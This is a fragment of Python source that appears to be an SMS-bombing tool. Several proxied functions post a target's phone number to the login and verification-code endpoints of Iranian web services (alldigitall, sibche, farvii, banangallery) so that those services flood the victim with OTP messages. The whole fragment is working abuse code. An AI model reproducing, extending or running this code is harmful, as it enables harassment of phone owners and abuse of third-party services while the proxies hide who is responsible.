...
@handler.sms_api
def alldigitall(num, proxies):
    post(proxies=proxies, url="https://api.alldigitall.ir/v1/auth/init?store_id=0",
...
@handler.sms_api
def sibche(num, proxies):
    post(proxies=proxies, url="https://api.sibche.com/profile/sendCode",
...
def farvi(num, proxies):
    post(proxies=proxies, url="https://farvii.com/api/v1/sessions/login_request",
                    json={"mobile_phone": f'0{num}'},
                    )    
...
@handler.sms_api
def banangallery(num, proxies):
    post(proxies=proxies, url="https://banangallery.ir/users/login-register/",
                    json={"Mobile": f'0{num}'},
                    )
